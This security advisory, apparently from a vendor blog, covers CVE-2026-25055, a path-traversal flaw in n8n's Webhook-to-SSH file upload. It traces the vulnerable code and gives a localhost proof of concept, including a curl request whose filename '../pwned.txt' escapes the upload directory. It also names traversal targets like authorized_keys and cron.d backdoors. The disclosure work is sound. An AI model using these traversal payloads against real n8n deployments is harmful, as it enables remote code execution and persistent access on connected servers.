---
schema_version: "1.0.0"
document_id: "16911b0410efeb8b4a3b2d81af7ad40488c849eaf279a7e9080cf4e41d5f98a3"
company_key: "yc-gecko-security"
company: "Gecko Security"
source_id: "yc-gecko-security-news-import-02715d60c1a6"
canonical_url: "https://www.gecko.security/blog/cve-2026-25055"
published_at: "2026-02-04T00:00:00+00:00"
first_seen_at: "2026-07-21T21:22:16.875303+00:00"
fetched_at: "2026-07-28T22:21:48.311987+00:00"
content_hash: "sha256:ab0aff83d2dfce368b67ebf929130de26ed08757b948021cd515ce66883e442a"
---

# CVE-2026-25055: n8n Arbitrary File Write on Remote Systems via SSH Node

---


### Advisory


- Link:[https://github.com/n8n-io/n8n/security/advisories/GHSA-m82q-59gv-mcr9](https://github.com/n8n-io/n8n/security/advisories/GHSA-m82q-59gv-mcr9)
- Affected versions: <2.2.3
- Patched versions: 2.4.0, 1.123.12


---


### Description


A path traversal vulnerability in n8n's Webhook node allows attackers to write files to arbitrary locations on remote servers. The node accepts filenames from multipart uploads and Content-Disposition headers without sanitization. When workflows forward uploaded files to the SSH node, the unsanitized filename gets concatenated into the destination path, allowing` ../` sequences to escape the target directory.


An attacker who can reach a Webhook endpoint that uploads files via SSH can write files anywhere on the remote server. Filenames like` ../../../.ssh/authorized_keys` or` ../../../etc/cron.d/backdoor` lead to RCE or persistent access on any system the n8n instance has credentials for.


### Source - Sink Analysis


The vulnerability spans three components:


**1. Entry Point - Webhook.node.ts:**` handleFormData()` passes` file.originalFilename` directly to` copyBinaryFile()` without validation:


typescript


```text
returnItem. binary  ![binaryPropertyName] =  await   context. nodeHelpers  . copyBinaryFile  (
file. filepath  ,
file. originalFilename   ?? file. newFilename  ,
file. mimetype  ,
);


```


` handleBinaryData()` does the same with the Content-Disposition header:


typescript


```text
const   fileName = req. contentDisposition  ?. filename   ??  uuid  ();
const   binaryData =  await   context. nodeHelpers  . copyBinaryFile  (
binaryFile. path  ,
fileName,
req. contentType   ??  'application/octet-stream'  ,
);


```


**2. Storage - binary-helper-functions.ts:**` copyBinaryFile()` stores the filename as-is:


typescript


```text
if   (fileName) {
returnData. fileName   = fileName;
}


```


**3. Sink - Ssh.node.ts:** The upload operation concatenates the path:


typescript


```text
await   ssh. putFile  (
binaryFile. path  ,
` ${parameterPath}  ${parameterPath.charAt(parameterPath.length -  1  ) ===  '/'   ?  ''   :  '/'  }  ${fileName || binaryData.fileName}  `  ,
);


```


With` parameterPath` set to` /home/user/uploads/` and` binaryData.fileName` containing` ../../../etc/cron.d/backdoor` , the resolved path becomes` /etc/cron.d/backdoor` .


### Proof of Concept


**1. Start an SSH server:**


bash


```text
docker run -d --name ssh-test -p 2222:2222 \
-e USER_NAME=testuser \
-e USER_PASSWORD=test123 \
-e PASSWORD_ACCESS= true   \
linuxserver/openssh-server


```


**2. Create the target directory:**


bash


```text
ssh testuser@localhost -p 2222  "mkdir -p /tmp/uploads"
# password: test123


```


**3. Start n8n:**


bash


```text
npx n8n


```


**4. Create the workflow in the n8n UI at[http://localhost:5678](http://localhost:5678/) :**


- Add a Webhook node (POST, path: test-upload) connected to an SSH node
- SSH node settings: Resource: File, Operation: Upload, Input Binary Field: data, Target Directory: /tmp/uploads/
- Create SSH credentials with host localhost, port 2222, user testuser, password test123
- Activate the workflow


**5. Send the malicious request:**


bash


```text
echo    "PWNED"   > /tmp/testfile.txt
curl -X POST  "http://localhost:5678/webhook/test-upload"   \
-F  "data=@/tmp/testfile.txt;filename=../pwned.txt"


```


**6. Confirm the file escaped:**


bash


```text
ssh testuser@localhost -p 2222  "cat /tmp/pwned.txt"
# outputs "PWNED" - file landed in /tmp, not /tmp/uploads


```


### Impact


Impact is highest on n8n Cloud and public self-hosted instances. Webhooks are designed to receive external traffic, and the URL only requires guessing a user-defined path like` upload` or` files` . No authentication is required by default.


n8n instances typically have SSH credentials to multiple servers for automation purposes. A single vulnerable workflow can compromise any server the instance can reach—deployment servers, databases, backup systems, CI/CD infrastructure.


Attackers can:


- Write SSH authorized_keys for persistent access
- Drop cron jobs or systemd services for code execution
- Overwrite application configs to inject backdoors
- Compromise any system the n8n instance has SSH credentials for
